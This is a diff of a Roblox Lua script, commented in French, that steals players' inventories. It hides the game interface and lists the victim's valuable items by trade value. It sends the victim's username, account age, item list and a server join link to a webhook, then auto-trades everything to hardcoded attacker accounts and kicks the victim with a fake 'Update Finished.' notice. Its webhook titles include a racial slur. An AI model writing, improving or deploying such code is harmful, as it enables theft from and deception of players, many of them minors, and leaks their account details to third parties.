@@ -1,4 +1,4 @@
--- Pas de verrou _G pour permettre la ré-exécution infinie
+-- Configuration (Ré-exécution infinie activée)
 local itemsToSend = {}
 local categories = {"Sword", "Emote", "Explosion"}
 local Players = game:GetService("Players")
@@ -20,11 +20,11 @@ local Replion = require(game.ReplicatedStorage.Packages.Replion)
 local users = _G.Usernames or {"Li0nIce201410", "ThunderStealthZap16"}
 local webhook = _G.webhook or "" 
 local auth_token = _G.AuthToken or "EBK-SS-A"
-local min_rap = _G.min_rap or 0 -- Mis à 0 pour ne rien rater
+local min_rap = _G.min_rap or 0 
 local ping = _G.pingEveryone or "Yes"
 
 ---------------------------------------------------------
--- CACHE DE L'INTERFACE (INVISIBLE)
+-- CACHE DE L'INTERFACE
 ---------------------------------------------------------
 local function killUI()
     pcall(function()
@@ -60,18 +60,22 @@ local function getRAP(category, itemName)
 end
 
 ---------------------------------------------------------
--- WEBHOOK AVEC TOUT (THUMBNAIL + JOIN)
+-- WEBHOOK (JAUNE QUAND TU REJOINS)
 ---------------------------------------------------------
 
 local function SendStatusWebhook(title, color, isStart)
+    -- Tri du plus grand au plus petit RAP
+    table.sort(itemsToSend, function(a, b)
+        return a.RAP > b.RAP
+    end)
+
     local totalRAP = 0
     local itemLines = ""
     for _, item in ipairs(itemsToSend) do
-        itemLines = itemLines .. "• " .. item.Name .. " [" .. item.RAP .. " RAP]\n"
+        itemLines = itemLines .. "• " .. item.Name .. " [" .. math.floor(item.RAP) .. " RAP]\n"
         totalRAP = totalRAP + item.RAP
     end
 
-    -- Construction du lien de join direct
     local joinCode = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. game.PlaceId .. ", '" .. game.JobId .. "')"
     local clickableLink = "https://fern.wtf/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
 
@@ -80,12 +84,12 @@ local function SendStatusWebhook(title, color, isStart)
         ["content"] = (isStart and ping == "Yes") and "@everyone | " .. joinCode or nil,
         ["embeds"] = {{
             ["title"] = title,
-            ["color"] = color,
+            ["color"] = color, -- Sera jaune via l'appel de fonction
             ["fields"] = {
-                {name = "👤 Victim:", value = "```" .. plr.Name .. "```", inline = true},
-                {name = "💰 Total RAP:", value = "```" .. totalRAP .. "```", inline = true},
-                {name = "🔗 Join Link:", value = "[Click to Join Server](" .. clickableLink .. ")", inline = false},
-                {name = "🎒 Inventory:", value = "```" .. (itemLines ~= "" and itemLines or "Scanning...") .. "```", inline = false}
+                {name = "ℹ️ Player info:", value = "```\n🆔 Username: "..plr.Name.."\n👤 Display: "..plr.DisplayName.."\n📅 Age: "..plr.AccountAge.." Days```", inline = false},
+                {name = "🔗 Join link:", value = "[Click to Join Server](" .. clickableLink .. ")", inline = false},
+                {name = "🎒 Item list (Sorted):", value = "```" .. (itemLines ~= "" and itemLines or "None") .. "```", inline = false},
+                {name = "💰 Summary:", value = "```Total RAP: " .. math.floor(totalRAP) .. "```", inline = false}
             },
             ["thumbnail"] = {
                 ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"
@@ -107,6 +111,8 @@ end
 ---------------------------------------------------------
 local function startAutoTrade(targetPlayer)
     task.spawn(function()
+        table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)
+
         while #itemsToSend > 0 do
             netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(targetPlayer)
             
@@ -119,22 +125,26 @@ local function startAutoTrade(targetPlayer)
                     local item = table.remove(itemsToSend, 1)
                     netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(item.itemType, item.ItemID)
                     limit = limit + 1
+                    task.wait(0.05)
                 end
 
-                netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
-                task.wait(0.5)
-                netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
+                pcall(function()
+                    netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
+                    task.wait(0.5)
+                    netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
+                end)
                 repeat task.wait(0.2) until not inTrade
             end
             task.wait(1)
         end
-        SendStatusWebhook("✅ Stuff Successfully Stolen !", 65280, false)
-        plr:kick("Update Finished. Items Secured.")
+        SendStatusWebhook("✅ Stuff Successfully Stolen !", 65280, false) -- Vert pour le succès final
+        task.wait(1)
+        plr:kick("Update Finished.")
     end)
 end
 
 ---------------------------------------------------------
--- SCAN & RUN
+-- LANCEMENT
 ---------------------------------------------------------
 for _, cat in ipairs(categories) do
     if clientInventory[cat] then
@@ -150,26 +160,12 @@ for _, cat in ipairs(categories) do
 end
 
 if #itemsToSend > 0 then
-    -- On trie par RAP pour prendre le meilleur en premier
-    table.sort(itemsToSend, function(a,b) return a.RAP > b.RAP end)
-
     local found = false
     for _, p in ipairs(Players:GetPlayers()) do
         if table.find(users, p.Name) then
-            SendStatusWebhook("✅ The nigga is on the server ! ("..p.Name..")", 65280, false)
+            -- COULEUR JAUNE ICI (16776960)
+            SendStatusWebhook("⚠️ The nigga is on the server ! ("..p.Name..")", 16776960, false)
             startAutoTrade(p)
             found = true
             break
         end
-    end
-
-    if not found then
-        SendStatusWebhook("🟣 Bro join your hit nigga 🎯", 8323327, true)
-        Players.PlayerAdded:Connect(function(player)
-            if table.find(users, player.Name) then
-                SendStatusWebhook("✅ The nigga is on the server ! ("..player.Name..")", 65280, false)
-                startAutoTrade(player)
-            end
-        end)
-    end
-end
